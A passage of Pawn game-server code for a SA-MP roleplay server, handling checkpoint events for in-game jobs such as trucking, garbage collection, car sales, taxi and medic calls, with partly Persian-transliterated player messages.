        SCM(playerid,-1,string);
		} else SCM(playerid,-1,"Bayad Dakhele Mashin Sherkati Bashid!");
		return 1;
        
	}
	if(CP[playerid] == 512512)
	{
	    DisablePlayerCheckpoint(playerid);
        ShowPlayerDialog(playerid,DIALOG_BANK_LIST,DIALOG_STYLE_LIST,"Bank","Bardasht\nVariz\nMojoodi\nEnteghal","Entekhab","Enseraf");
        OnCheckpoint[playerid] = 0;
        CP[playerid] = 0;
        IsPlayerBankCheckpoint[playerid] = true;
	}
    if(CP[playerid] == 1187)
    {
        CP[playerid] = 0;
        DisablePlayerCheckpoint(playerid);
        OnCheckpoint[playerid] = 0;
        SCM(playerid,COLOR_Good,"Here is your rented vehicle.");
    }
    if(locatemashin[playerid] == 1)
    {
        locatemashin[playerid] = 0;
        OnCheckpoint[playerid] = 0;
        DisablePlayerCheckpoint(playerid);
        SCM(playerid,COLOR_ALI,"Here's your car.");
    }
    else if(locatemashin[playerid] == 2)
    {
        locatemashin[playerid] = 0;
        OnCheckpoint[playerid] = 0;
        DisablePlayerCheckpoint(playerid);
        SCM(playerid,COLOR_LIGHTBLUE,"Mashin Shoma Ghofl Mibashad , Baraye Baz Kardane Ghofl An Bayad Dokme N Ra Bezanid.");
    }
    new string[256];
    if(TaxiCallTime[playerid] > 0 && IAcceptTaxi[playerid] == 1)
    {
        IAcceptTaxi[playerid] = 0;
        GameTextForPlayer(playerid, "~w~Reached destination", 5000, 1);
        TaxiCallTime[playerid] = 0;
        OnCheckpoint[playerid] = 0;
        DisablePlayerCheckpoint(playerid);
        IWantTaxi[TaxiAccepted[playerid]] = 0;
        TaxiAccepted[playerid] = INVALID_PLAYER_ID;
    }
    else if(MechanicCallTime[playerid] == 1)
    {
        GameTextForPlayer(playerid, "~w~Reached destination", 5000, 1);
        OnCheckpoint[playerid] = 0;
        DisablePlayerCheckpoint(playerid);
        MechanicCallTime[playerid] = 0;
        IWantMechanic[MechanicAccepted[playerid]] = 0;
        MechanicAccepted[playerid] = 9999;
    }
    else if(MedicCallTime[playerid] == 1)
    {
        GameTextForPlayer(playerid, "~w~Reached destination", 5000, 1);
        OnCheckpoint[playerid] = 0;
        DisablePlayerCheckpoint(playerid);
        MedicCallTime[playerid] = 0;
        IWantMedic[MedicAccepted[playerid]] = 0;
        MedicAccepted[playerid] = 9999;
    }
    if(CP[playerid] == 58723)
    {
        if(PINFO[playerid][pMember] != 8 && PINFO[playerid][pLeader] != 8) {DisablePlayerCheckpoint(playerid);OnCheckpoint[playerid] = 0;CP[playerid] = 0;return 1;}
        if(PINFO[playerid][pGunLic] <= 0) {DisablePlayerCheckpoint(playerid);OnCheckpoint[playerid] = 0;CP[playerid] = 0;return SCM(playerid, COLOR_LIGHTBLUE, "You haven't a weapon license.");}
        switch(HitmanTofangPackage[playerid])
        {
            case 1:{GivePlayerTofang(playerid,23,200);GivePlayerTofang(playerid,29,200);GivePlayerTofang(playerid,34,200); }
            case 2:{GivePlayerTofang(playerid,23,200);GivePlayerTofang(playerid,29,200);GivePlayerTofang(playerid,34,200);GivePlayerTofang(playerid,31,200); }
            case 3:{GivePlayerTofang(playerid,23,200);GivePlayerTofang(playerid,29,200);GivePlayerTofang(playerid,34,200);GivePlayerTofang(playerid,30,200); }
            case 4:{GivePlayerTofang(playerid,23,200);GivePlayerTofang(playerid,29,200);GivePlayerTofang(playerid,34,200);GivePlayerTofang(playerid,31,200); }
            case 5:{GivePlayerTofang(playerid,23,200);GivePlayerTofang(playerid,29,200);GivePlayerTofang(playerid,34,200);GivePlayerTofang(playerid,30,200); }
            case 6:{GivePlayerTofang(playerid,23,200);GivePlayerTofang(playerid,29,200);GivePlayerTofang(playerid,34,200);GivePlayerTofang(playerid,31,200); }
            case 7:{GivePlayerTofang(playerid,23,200);GivePlayerTofang(playerid,29,200);GivePlayerTofang(playerid,34,200);GivePlayerTofang(playerid,30,200); }
        }
        DisablePlayerCheckpoint(playerid);OnCheckpoint[playerid] = 0;CP[playerid] = 0;
        PlayerPlaySound(playerid,1149,0.0,0.0,0.0);
        return 1;

    }
    if(CP[playerid] == 12345)
    {
        new vehicle = GetPlayerVehicleID(playerid);
        if(TruckAllowed[playerid] == 0 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER && IsaTruckCar(vehicle))
        {
            if(TruckLevel[playerid] == 0 || TruckLevel[playerid] == 10)
            {
                TruckLevel[playerid] = 1;
                TruckAllowed[playerid] = 1;
                OnCheckpoint[playerid] = 1;
                SetPlayerCheckpoint(playerid,-184.852737,-278.438751,1.156767,4.0);
                CP[playerid] = 12349;
                SCM(playerid,COLOR_YELLOW,"Go and take a trailer and transport it to the checkpoint.");
                return 1;
            }
            if(TruckLevel[playerid] == 1)
            {
                TruckLevel[playerid] = 2;
                TruckAllowed[playerid] = 1;
                OnCheckpoint[playerid] = 1;
                SetPlayerCheckpoint(playerid,-23.151823,19.092706,2.844216,4.0);
                CP[playerid] = 1234562;
                SCM(playerid,COLOR_YELLOW,"Go and take a trailer and transport it to the checkpoint.");
                return 1;
            }
            if(TruckLevel[playerid] == 2)
            {
                TruckLevel[playerid] = 3;
                TruckAllowed[playerid] = 1;
                OnCheckpoint[playerid] = 1;
                SetPlayerCheckpoint(playerid,2140.185058,2513.634033,10.820312,4.0);
                CP[playerid] = 1234563;
                SCM(playerid,COLOR_YELLOW,"Go and take a trailer and transport it to the checkpoint.");
                return 1;
            }
            if(TruckLevel[playerid] == 3)
            {
                TruckLevel[playerid] = 4;
                TruckAllowed[playerid] = 1;
                OnCheckpoint[playerid] = 1;
                SetPlayerCheckpoint(playerid,2399.868404,2806.395019,10.820312,4.0);
                CP[playerid] = 1234564;
                SCM(playerid,COLOR_YELLOW,"Go and take a trailer and transport it to the checkpoint.");
                return 1;
            }
            if(TruckLevel[playerid] == 4)
            {
                TruckLevel[playerid] = 5;
                TruckAllowed[playerid] = 1;
                OnCheckpoint[playerid] = 1;
                SetPlayerCheckpoint(playerid,-1041.484863,-1260.395629,128.775451,4.0);
                CP[playerid] = 1234565;
                SCM(playerid,COLOR_YELLOW,"Go and take a trailer and transport it to the checkpoint.");
                return 1;
            }
            if(TruckLevel[playerid] == 5)
            {
                TruckLevel[playerid] = 6;
                TruckAllowed[playerid] = 1;
                OnCheckpoint[playerid] = 1;
                SetPlayerCheckpoint(playerid,2045.757202,-2205.050292,13.546875,4.0);
                CP[playerid] = 1234566;
                SCM(playerid,COLOR_YELLOW,"Go and take a trailer and transport it to the checkpoint.");
                return 1;
            }
            if(TruckLevel[playerid] == 6)
            {
                TruckLevel[playerid] = 7;
                TruckAllowed[playerid] = 1;
                OnCheckpoint[playerid] = 1;
                SetPlayerCheckpoint(playerid,1647.317260,920.111572,10.671875,4.0);
                CP[playerid] = 1234567;
                SCM(playerid,COLOR_YELLOW,"Go and take a trailer and transport it to the checkpoint.");
                return 1;
            }
            if(TruckLevel[playerid] == 7)
            {
                TruckLevel[playerid] = 8;
                TruckAllowed[playerid] = 1;
                OnCheckpoint[playerid] = 1;
                SetPlayerCheckpoint(playerid,388.436584,2588.690917,16.474586,4.0);
                CP[playerid] = 1234568;
                SCM(playerid,COLOR_YELLOW,"Go and take a trailer and transport it to the checkpoint.");
                return 1;
            }
            if(TruckLevel[playerid] == 8)
            {
                TruckLevel[playerid] = 9;
                TruckAllowed[playerid] = 1;
                OnCheckpoint[playerid] = 1;
                SetPlayerCheckpoint(playerid,-540.005920,2580.670898,53.414062,4.0);
                CP[playerid] = 1234569;
                SCM(playerid,COLOR_YELLOW,"Go and take a trailer and transport it to the checkpoint.");
                return 1;
            }
            if(TruckLevel[playerid] == 9)
            {
                TruckLevel[playerid] = 10;
                TruckAllowed[playerid] = 1;
                OnCheckpoint[playerid] = 1;
                SetPlayerCheckpoint(playerid,-2444.194824,2238.302490,4.843750,4.0);
                CP[playerid] = 1234570;
                SCM(playerid,COLOR_YELLOW,"Go and take a trailer and transport it to the checkpoint.");
                return 1;
            }
        }
    }
    else if(CP[playerid] == 12389)
    {
        OnCheckpoint[playerid] = 1;
        CP[playerid] = 12390;
        SetPlayerCheckpoint(playerid,-376.053833,-1431.996826,25.726562,4);
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
    }
    else if(CP[playerid] == 12390)
    {
        new cash = RandomShomare(3,6);
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,-313.921447,-1382.667480,11.314981,5);
        CP[playerid] = 12391;
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
        GivePlayerPool(playerid,cash);
        format(string, sizeof(string), "~y~PayOff~w~ $%d",cash);
        GameTextForPlayer(playerid, string, 4000, 5);
    }
    else if(CP[playerid] == 12391)
    {
        OnCheckpoint[playerid] = 1;
        CP[playerid] = 12392;
        SetPlayerCheckpoint(playerid,-376.053833,-1431.996826,25.726562,4);
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
    }
    else if(CP[playerid] == 12392)
    {
        new cash = RandomShomare(3,6);
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,-317.527496,-1327.227249,9.058633,5);
        CP[playerid] = 12393;
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
        GivePlayerPool(playerid,cash);
        format(string, sizeof(string), "~y~PayOff~w~ $%d",cash);
        GameTextForPlayer(playerid, string, 4000, 5);
    }
    else if(CP[playerid] == 12393)
    {
        OnCheckpoint[playerid] = 1;
        CP[playerid] = 12394;
        SetPlayerCheckpoint(playerid,-376.053833,-1431.996826,25.726562,4);
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
    }
    else if(CP[playerid] == 12394)
    {
        new cash = RandomShomare(3,6);
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,-303.710906,-1318.423828,9.106340,5);
        CP[playerid] = 12395;
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
        GivePlayerPool(playerid,cash);
        format(string, sizeof(string), "~y~PayOff~w~ $%d",cash);
        GameTextForPlayer(playerid, string, 4000, 5);
    }
    else if(CP[playerid] == 12395)
    {
        OnCheckpoint[playerid] = 1;
        CP[playerid] = 12396;
        SetPlayerCheckpoint(playerid,-376.053833,-1431.996826,25.726562,4);
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
    }
    else if(CP[playerid] == 12396)
    {
        new cash = RandomShomare(3,6);
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,-371.492431,-1323.586547,24.562522,5);
        CP[playerid] = 12397;
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
        GivePlayerPool(playerid,cash);
        format(string, sizeof(string), "~y~PayOff~w~ $%d",cash);
        GameTextForPlayer(playerid, string, 4000, 5);
    }
    else if(CP[playerid] == 12397)
    {
        OnCheckpoint[playerid] = 1;
        CP[playerid] = 12398;
        SetPlayerCheckpoint(playerid,-376.053833,-1431.996826,25.726562,4);
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
    }
    else if(CP[playerid] == 12398)
    {
        new cash = RandomShomare(3,6);
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,-402.660888,-1290.676513,31.735294,5);
        CP[playerid] = 12399;
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
        GivePlayerPool(playerid,cash);
        format(string, sizeof(string), "~y~PayOff~w~ $%d",cash);
        GameTextForPlayer(playerid, string, 4000, 5);
    }
    else if(CP[playerid] == 12399)
    {
        OnCheckpoint[playerid] = 1;
        CP[playerid] = 12400;
        SetPlayerCheckpoint(playerid,-376.053833,-1431.996826,25.726562,4);
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
    }
    else if(CP[playerid] == 12400)
    {
        new cash = RandomShomare(3,6);
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,-402.660888,-1290.676513,31.735294,5);
        CP[playerid] = 12401;
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
        GivePlayerPool(playerid,cash);
        format(string, sizeof(string), "~y~PayOff~w~ $%d",cash);
        GameTextForPlayer(playerid, string, 4000, 5);
    }
    else if(CP[playerid] == 12401)
    {
        OnCheckpoint[playerid] = 1;
        CP[playerid] = 12402;
        SetPlayerCheckpoint(playerid,-376.053833,-1431.996826,25.726562,4);
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
    }
    else if(CP[playerid] == 12402)
    {
        new cash = RandomShomare(3,6);
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,-167.472991,-1409.605102,3.036767,5);
        CP[playerid] = 12389;
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
        GivePlayerPool(playerid,cash);
        format(string, sizeof(string), "~y~PayOff~w~ $%d",cash);
        GameTextForPlayer(playerid, string, 4000, 5);
    }
    else if(CP[playerid] == 35469)
    {
        OnCheckpoint[playerid] = 1;
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
        CP[playerid] = 35470;
        SetPlayerCheckpoint(playerid,-1049.533569,-1196.379882,128.589813,5);
    }
    else if(CP[playerid] == 35470)
    {
        new cash = RandomShomare(10,20);
        OnCheckpoint[playerid] = 1;
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
        CP[playerid] = 35471;
        SetPlayerCheckpoint(playerid,-1066.485229,-972.397888,129.218750,5);
        GivePlayerPool(playerid,cash);
        format(string, sizeof(string), "~y~PayOff~w~ $%d",cash);
        GameTextForPlayer(playerid, string, 4000, 5);
    }
    else if(CP[playerid] == 35471)
    {
        OnCheckpoint[playerid] = 1;
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
        CP[playerid] = 35472;
        SetPlayerCheckpoint(playerid,-1049.533569,-1196.379882,128.589813,5);
    }
    else if(CP[playerid] == 35472)
    {
        new cash = RandomShomare(10,20);
        OnCheckpoint[playerid] = 1;
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
        CP[playerid] = 35473;
        SetPlayerCheckpoint(playerid,-1047.418945,-1028.907348,129.211929,5);
        GivePlayerPool(playerid,cash);
        format(string, sizeof(string), "~y~PayOff~w~ $%d",cash);
        GameTextForPlayer(playerid, string, 4000, 5);
    }
    else if(CP[playerid] == 35473)
    {
        OnCheckpoint[playerid] = 1;
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
        CP[playerid] = 35474;
        SetPlayerCheckpoint(playerid,-1049.533569,-1196.379882,128.589813,5);
    }
    else if(CP[playerid] == 42369423)
    {
        DisablePlayerCheckpoint(playerid);
        OnCheckpoint[playerid] = 0;
    }
    else if(CP[playerid] == 35474)
    {
        OnCheckpoint[playerid] = 1;
        new cash = RandomShomare(10,20);
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
        CP[playerid] = 35475;
        SetPlayerCheckpoint(playerid,-1117.415405,-1055.386230,129.218750,5);
        GivePlayerPool(playerid,cash);
        format(string, sizeof(string), "~y~PayOff~w~ $%d",cash);
        GameTextForPlayer(playerid, string, 4000, 5);
    }
    else if(CP[playerid] == 35475)
    {
        OnCheckpoint[playerid] = 1;
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
        CP[playerid] = 35476;
        SetPlayerCheckpoint(playerid,-1049.533569,-1196.379882,128.589813,5);
    }
    else if(CP[playerid] == 35476)
    {
        new cash = RandomShomare(10,20);
        OnCheckpoint[playerid] = 1;
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
        CP[playerid] = 35477;
        SetPlayerCheckpoint(playerid,-1013.720947,-921.570800,129.212646,5);
        GivePlayerPool(playerid,cash);
        format(string, sizeof(string), "~y~PayOff~w~ $%d",cash);
        GameTextForPlayer(playerid, string, 4000, 5);
    }
    else if(CP[playerid] == 35477)
    {
        OnCheckpoint[playerid] = 1;
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
        CP[playerid] = 35478;
        SetPlayerCheckpoint(playerid,-1049.533569,-1196.379882,128.589813,5);
    }
    else if(CP[playerid] == 35478)
    {
        OnCheckpoint[playerid] = 1;
        new cash = RandomShomare(10,20);
        PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
        CP[playerid] = 35469;
        SetPlayerCheckpoint(playerid,-1110.039184,-1009.396606,128.780563,5);
        GivePlayerPool(playerid,cash);
        format(string, sizeof(string), "~y~PayOff~w~ $%d",cash);
        GameTextForPlayer(playerid, string, 4000, 5);
    }
    else if(CP[playerid] == 12349)
    {
        new vehicle = GetPlayerVehicleID(playerid);
        if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && IsaTruckCar(vehicle))
        {
            new attach = GetVehicleTrailer(vehicle);
            if(IsaTruckCar(attach))
            {
                OnCheckpoint[playerid] = 1;
                SetVehicleToRespawn(attach);
                TruckAllowed[playerid] = 0;
                GivePlayerPool(playerid,200); SCM(playerid,COLOR_ALI,"You have earned $200 for this delivery.");
                SetPlayerCheckpoint(playerid,-80.585586,-1130.416870,0.805137,4.0);
                CP[playerid] = 12345;
                DetachTrailerFromVehicle(vehicle);
            }
            else return SCM(playerid,COLOR_LIGHTBLUE,"There is no trailer attached to your vehicle.");
        }
    }
    else if(CP[playerid] == 1234562)
    {
        new vehicle = GetPlayerVehicleID(playerid);
        if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && IsaTruckCar(vehicle))
        {
            new attach = GetVehicleTrailer(vehicle);
            if(IsaTruckCar(attach))
            {
                OnCheckpoint[playerid] = 1;
                SetVehicleToRespawn(attach);
                TruckAllowed[playerid] = 0;
                GivePlayerPool(playerid,350); SCM(playerid,COLOR_ALI,"You have earned $350 for this delivery.");
                SetPlayerCheckpoint(playerid,-80.585586,-1130.416870,0.805137,4.0);
                CP[playerid] = 12345;
                DetachTrailerFromVehicle(vehicle);
            }
            else return SCM(playerid,COLOR_LIGHTBLUE,"There is no trailer attached to your vehicle.");
        }
    }
    else if(CP[playerid] == 1234563)
    {
        new vehicle = GetPlayerVehicleID(playerid);
        if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && IsaTruckCar(vehicle))
        {
            new attach = GetVehicleTrailer(vehicle);
            if(IsaTruckCar(attach))
            {
                OnCheckpoint[playerid] = 1;
                SetVehicleToRespawn(attach);
                TruckAllowed[playerid] = 0;
                GivePlayerPool(playerid,500); SCM(playerid,COLOR_ALI,"You have earned $500 for this delivery.");
                SetPlayerCheckpoint(playerid,-80.585586,-1130.416870,0.805137,4.0);
                CP[playerid] = 12345;
                DetachTrailerFromVehicle(vehicle);
            }
            else return SCM(playerid,COLOR_LIGHTBLUE,"There is no trailer attached to your vehicle.");
        }
    }
    else if(CP[playerid] == 1234564)
    {
        new vehicle = GetPlayerVehicleID(playerid);
        if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && IsaTruckCar(vehicle))
        {
            new attach = GetVehicleTrailer(vehicle);
            if(IsaTruckCar(attach))
            {
                OnCheckpoint[playerid] = 1;
                SetVehicleToRespawn(attach);
                TruckAllowed[playerid] = 0;
                GivePlayerPool(playerid,600); SCM(playerid,COLOR_ALI,"You have earned $600 for this delivery.");
                SetPlayerCheckpoint(playerid,-80.585586,-1130.416870,0.805137,4.0);
                CP[playerid] = 12345;
                DetachTrailerFromVehicle(vehicle);
            }
            else return SCM(playerid,COLOR_LIGHTBLUE,"There is no trailer attached to your vehicle.");
        }
    }
    else if(CP[playerid] == 1234565)
    {
        new vehicle = GetPlayerVehicleID(playerid);
        if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && IsaTruckCar(vehicle))
        {
            new attach = GetVehicleTrailer(vehicle);
            if(IsaTruckCar(attach))
            {
                OnCheckpoint[playerid] = 1;
                SetVehicleToRespawn(attach);
                TruckAllowed[playerid] = 0;
                GivePlayerPool(playerid,300); SCM(playerid,COLOR_ALI,"You have earned $300 for this delivery.");
                SetPlayerCheckpoint(playerid,-80.585586,-1130.416870,0.805137,4.0);
                CP[playerid] = 12345;
                DetachTrailerFromVehicle(vehicle);
            }
            else return SCM(playerid,COLOR_LIGHTBLUE,"There is no trailer attached to your vehicle.");
        }
    }
    else if(CP[playerid] == 1234566)
    {
        new vehicle = GetPlayerVehicleID(playerid);
        if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && IsaTruckCar(vehicle))
        {
            new attach = GetVehicleTrailer(vehicle);
            if(IsaTruckCar(attach))
            {
                OnCheckpoint[playerid] = 1;
                SetVehicleToRespawn(attach);
                TruckAllowed[playerid] = 0;
                GivePlayerPool(playerid,300); SCM(playerid,COLOR_ALI,"You have earned $300 for this delivery.");
                SetPlayerCheckpoint(playerid,-80.585586,-1130.416870,0.805137,4.0);
                CP[playerid] = 12345;
                DetachTrailerFromVehicle(vehicle);
            }
            else return SCM(playerid,COLOR_LIGHTBLUE,"There is no trailer attached to your vehicle.");
        }
    }
    else if(CP[playerid] == 1234567)
    {
        new vehicle = GetPlayerVehicleID(playerid);
        if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && IsaTruckCar(vehicle))
        {
            new attach = GetVehicleTrailer(vehicle);
            if(IsaTruckCar(attach))
            {
                OnCheckpoint[playerid] = 1;
                SetVehicleToRespawn(attach);
                TruckAllowed[playerid] = 0;
                GivePlayerPool(playerid,500); SCM(playerid,COLOR_ALI,"You have earned $500 for this delivery.");
                SetPlayerCheckpoint(playerid,-80.585586,-1130.416870,0.805137,4.0);
                CP[playerid] = 12345;
                DetachTrailerFromVehicle(vehicle);
            }
            else return SCM(playerid,COLOR_LIGHTBLUE,"There is no trailer attached to your vehicle.");
        }
    }
    else if(CP[playerid] == 1234568)
    {
        new vehicle = GetPlayerVehicleID(playerid);
        if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && IsaTruckCar(vehicle))
        {
            new attach = GetVehicleTrailer(vehicle);
            if(IsaTruckCar(attach))
            {
                OnCheckpoint[playerid] = 1;
                SetVehicleToRespawn(attach);
                TruckAllowed[playerid] = 0;
                GivePlayerPool(playerid,600); SCM(playerid,COLOR_ALI,"You have earned $600 for this delivery.");
                SetPlayerCheckpoint(playerid,-80.585586,-1130.416870,0.805137,4.0);
                CP[playerid] = 12345;
                DetachTrailerFromVehicle(vehicle);
            }
            else return SCM(playerid,COLOR_LIGHTBLUE,"There is no trailer attached to your vehicle.");
        }
    }
    else if(CP[playerid] == 1234569)
    {
        new vehicle = GetPlayerVehicleID(playerid);
        if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && IsaTruckCar(vehicle))
        {
            new attach = GetVehicleTrailer(vehicle);
            if(IsaTruckCar(attach))
            {
                OnCheckpoint[playerid] = 1;
                SetVehicleToRespawn(attach);
                TruckAllowed[playerid] = 0;
                GivePlayerPool(playerid,700); SCM(playerid,COLOR_ALI,"You have earned $700 for this delivery.");
                SetPlayerCheckpoint(playerid,-80.585586,-1130.416870,0.805137,4.0);
                CP[playerid] = 12345;
                DetachTrailerFromVehicle(vehicle);
            }
            else return SCM(playerid,COLOR_LIGHTBLUE,"There is no trailer attached to your vehicle.");
        }
    }
    else if(CP[playerid] == 1234570)
    {
        new vehicle = GetPlayerVehicleID(playerid);
        if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && IsaTruckCar(vehicle))
        {
            new attach = GetVehicleTrailer(vehicle);
            if(IsaTruckCar(attach))
            {
                OnCheckpoint[playerid] = 1;
                SetVehicleToRespawn(attach);
                TruckAllowed[playerid] = 0;
                GivePlayerPool(playerid,800); SCM(playerid,COLOR_ALI,"You have earned $800 for this delivery.");
                SetPlayerCheckpoint(playerid,-80.585586,-1130.416870,0.805137,4.0);
                CP[playerid] = 12345;
                DetachTrailerFromVehicle(vehicle);
            }
            else return SCM(playerid,COLOR_LIGHTBLUE,"There is no trailer attached to your vehicle.");
        }
    }
    else if(CP[playerid]==1)
    {
        if(IsPlayerInAnyVehicle(playerid))
        {
            if(PINFO[playerid][pJackSkill] < 401) {PlayerInfo[playerid][pJackSkill] ++; SaveKonVal(playerid, "pJackSkill", PINFO[playerid][pJackSkill]);}
            if(PlayerInfo[playerid][pJackSkill] == 50)
            { SendClientMessage(playerid, COLOR_YELLOW, "* Your Car Jack Skill is now Level 2, you will earn more Money and quicker Reload Time."); }
            else if(PlayerInfo[playerid][pJackSkill] == 100)
            { SendClientMessage(playerid, COLOR_YELLOW, "* Your Car Jack Skill is now Level 3, you will earn more Money and quicker Reload Time."); }
            else if(PlayerInfo[playerid][pJackSkill] == 200)
            { SendClientMessage(playerid, COLOR_YELLOW, "* Your Car Jack Skill is now Level 4, you will earn more Money and quicker Reload Time."); }
            else if(PlayerInfo[playerid][pJackSkill] == 400)
            { SendClientMessage(playerid, COLOR_YELLOW, "* Your Car Jack Skill is now Level 5, you will earn more Money and quicker Reload Time."); }
            new level = PlayerInfo[playerid][pJackSkill];
            if(level >= 0 && level <= 50)
            {
                new moneypay = RandomShomare(50, 100);
                format(string, sizeof(string), "You sold a car for $%s, your reload time is 3 minutes.",FormatNumber(moneypay));
                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                GivePlayerPool(playerid, moneypay);
                PlayerInfo[playerid][pCarTime] = 180;
                SaveKonVal(playerid, "pCarTime", 180);
            }
            else if(level >= 51 && level <= 100)
            {
                new moneypay = RandomShomare(100, 150);
                format(string, sizeof(string), "You sold a car for $%s, your reload time is 3 minutes.", FormatNumber(moneypay));
                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                GivePlayerPool(playerid, moneypay);
                PlayerInfo[playerid][pCarTime] = 180;
                SaveKonVal(playerid, "pCarTime", 180);
            }
            else if(level >= 101 && level <= 200)
            {
                new moneypay = RandomShomare(150, 250);
                format(string, sizeof(string), "You sold a car for $%s, your reload time is 3 minutes.", FormatNumber(moneypay));
                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                GivePlayerPool(playerid, moneypay);
                PlayerInfo[playerid][pCarTime] = 180;
                SaveKonVal(playerid, "pCarTime", 180);
            }
            else if(level >= 201 && level <= 400)
            {
                new moneypay = RandomShomare(250, 400);
                format(string, sizeof(string), "You sold a car for $%s, your reload time is 3 minutes.", FormatNumber(moneypay));
                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                GivePlayerPool(playerid, moneypay);
                PlayerInfo[playerid][pCarTime] = 180;
                SaveKonVal(playerid, "pCarTime", 180);
            }
            else if(level >= 401)
            {
                new money = 600;
                format(string, sizeof(string), "You sold a car for $%s, your reload time is 3 minutes.", FormatNumber(money));
                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                GivePlayerPool(playerid, money);
                PlayerInfo[playerid][pCarTime] = 180;
                SaveKonVal(playerid, "pCarTime", 180);
            }
            GameTextForPlayer(playerid, "~y~Sold the car", 2500, 1);
            CP[playerid] = 0;
            DisablePlayerCheckpoint(playerid);
            OnCheckpoint[playerid] = 0;
            SetVehicleToRespawn(GetPlayerVehicleID(playerid));
        }
        else
        {
            GameTextForPlayer(playerid, "Not in a car", 5000, 1);
        }
    }
    else if(CP[playerid] == 4002312)
    {
        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,2505.880859,-1775.203369,13.546875);
        Trashlevel[playerid] = 1;
    }
    else if(CP[playerid] == 4002313)
    {
        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,2435.575195,-1770.595092,13.546875);
        Trashlevel[playerid] = 2;
    }
    else if(CP[playerid] == 4002314)
    {
        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,2153.687255,-1724.774047,13.538188);
        Trashlevel[playerid] = 3;
    }
    else if(CP[playerid] == 4002315)
    {
        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,2114.340332,-1824.442871,13.556438);
        Trashlevel[playerid] = 4;
    }
    else if(CP[playerid] == 4002316)
    {
        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,2295.984375,-1712.385864,13.554470);
        Trashlevel[playerid] = 5;
    }
    else if(CP[playerid] == 4002317)
    {
        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,2231.493408,-1354.564941,23.986755);
        Trashlevel[playerid] = 6;
    }
    else if(CP[playerid] == 4002318)
    {
        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,2052.434570,-1103.771728,24.489671);
        Trashlevel[playerid] = 7;
    }
    else if(CP[playerid] == 4002319)
    {
        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,1922.792968,-1090.936889,24.656047);
        Trashlevel[playerid] = 8;
    }
    else if(CP[playerid] == 4002320)
    {
